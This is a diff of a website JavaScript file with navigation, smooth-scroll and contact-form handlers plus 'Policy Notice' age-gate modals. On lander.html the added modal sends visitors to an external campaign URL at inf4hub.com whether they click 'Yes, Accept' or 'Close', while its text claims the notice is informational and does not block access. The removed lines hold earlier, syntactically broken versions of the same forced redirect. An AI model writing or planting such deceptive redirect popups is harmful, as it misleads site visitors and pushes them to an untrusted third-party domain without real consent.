@@ -1,76 +1,101 @@
-// Minimal split: same behavior, two separate functions to call per page
-(function () {
-  // Use relative path so it works in subfolders too
-  const REDIRECT = "http://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]";
- 
-  function buildPopup() {
-    // prevent double render
-    if (document.querySelector(".modal-backdrop")) return null;
- 
-    const bd = document.createElement("div");
-    bd.className = "modal-backdrop";
-    bd.innerHTML = `
-      <div class="modal" role="dialog" aria-modal="true" aria-label="Policy Notice">
-        <h3>Policy Notice</h3>
-        <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
-        <div class="modal-actions">
-          <button class="btn" id="age-yes">Yes, Accept</button>
-          <button class="btn ghost" id="age-no">Close</button>
-        </div>
-      </div>`;
-    document.body.appendChild(bd);
-    bd.style.display = "flex";
- 
-    // define and return a working closer
-    function close() {
-      bd.classList.add("fade-out");
-      setTimeout(() => bd.remove(), 180);
+const navToggle=document.querySelector('[data-nav-toggle]');
+const navMenu=document.querySelector('[data-nav-menu]');
+if(navToggle&&navMenu){
+  navToggle.addEventListener('click',()=>{
+    navMenu.classList.toggle('open');
+    if(navMenu.classList.contains('open')){
+      navMenu.style.display='flex';
+    }else{
+      navMenu.style.display='';
     }
- 
-    return { bd, close };
+  });
+}
+
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',e=>{
+    const href=a.getAttribute('href');
+    if(href&&href.startsWith('#')){
+      const el=document.querySelector(href);
+      if(el){
+        e.preventDefault();
+        el.scrollIntoView({behavior:'smooth',block:'start'});
+      }
+    }
+  });
+});
+
+const form=document.querySelector('#contact-form');
+if(form){
+  form.addEventListener('submit',e=>{
+    e.preventDefault();
+    const data=Object.fromEntries(new FormData(form).entries());
+    alert(`Thanks ${data.name||'there'}! We'll reply to ${data.email||'your inbox'} soon.`);
+    form.reset();
+  });
+}
+
+(function(){
+  const path=window.location.pathname;
+  const isHome=/(^\/$|index\.html$)/.test(path);
+  if(!isHome)return;
+  if(sessionStorage.getItem('sl_age_shown')==='1')return;
+  sessionStorage.setItem('sl_age_shown','1');
+
+  const bd=document.createElement('div');
+  bd.className='modal-backdrop';
+  bd.innerHTML=`<div class="modal">
+    <h3>Policy Update</h3>
+    <p>Please confirm to continue.</p>
+    <div style="display:flex;gap:10px;flex-wrap:wrap">
+      <button class="btn" id="age-yes">Yes</button>
+      <button class="btn ghost" id="age-no">No</button>
+    </div>
+  </div>`;
+  document.body.appendChild(bd);
+  bd.style.display='flex';
+
+  function close(){
+    bd.style.display='none';
+    bd.remove();
   }
- 
-  // Call this on index.html
-  window.PopupIndex = function () {
-    // (optional) show once per session on index
-    if (sessionStorage.getItem("ageGateShown_index") === "1") return;
-    sessionStorage.setItem("ageGateShown_index", "1");
- 
-    const built = buildPopup();
-    if (!built) return;
-    const { bd, close } = built;
- 
-    // Your custom behavior: Yes = just close, No = go to privacy
-    bd.querySelector("#age-yes").addEventListener("click", function(){
-    window.location.href = "http://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]";
-    bd.querySelector("#age-no").addEventListener("click", function(){
-    window.location.href = "http://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]";
-      window.location.href = "http://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]";
-    });
-  };
- 
-  // Call this on lander.html
-  window.PopupLander = function () {
-    // (optional) show once per session on lander
-    if (sessionStorage.getItem("ageGateShown_lander") === "1") return;
-    sessionStorage.setItem("ageGateShown_lander", "1");
- 
-    const built = buildPopup();
-    if (!built) return;
-    const { bd } = built;
- 
-    // Your custom behavior: both buttons redirect
-    bd.querySelector("#age-yes").addEventListener("click", function(){
+
+  const yes=bd.querySelector('#age-yes');
+  const no=bd.querySelector('#age-no');
+  if(yes) yes.addEventListener('click',close);
+  if(no) no.addEventListener('click',close);
+})();
+
+(function(){
+  const path = window.location.pathname;
+  const isHome = /(^\/$|lander\.html$)/.test(path);
+  if(!isHome) return;
+  if(sessionStorage.getItem('ageGateShown') === '1') return;
+  sessionStorage.setItem('ageGateShown', '1');
+  const bd = document.createElement('div');
+  bd.className = 'modal-backdrop';
+  bd.innerHTML = `
+    <div class="modal">
+      <h3>Policy Notice</h3>
+      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <button class="btn" id="age-yes">Yes, Accept</button>
+        <button class="btn ghost" id="age-no">Close</button>
+      </div>
+    </div>`;
+  document.body.appendChild(bd);
+  bd.style.display='flex';
+  function closeGate(){ bd.style.display='none'; bd.remove(); }
+  bd.querySelector('#age-yes').addEventListener('click', function(){
     window.location.href = "http://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
                                                 
   bd.querySelector('#age-no').addEventListener('click', function(){
     window.location.href = "http://inf4hub.com/?utm_campaign=zxSxVTCG6M&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
-  };
+  });
 })();
- 
 
  
+
 
 
 
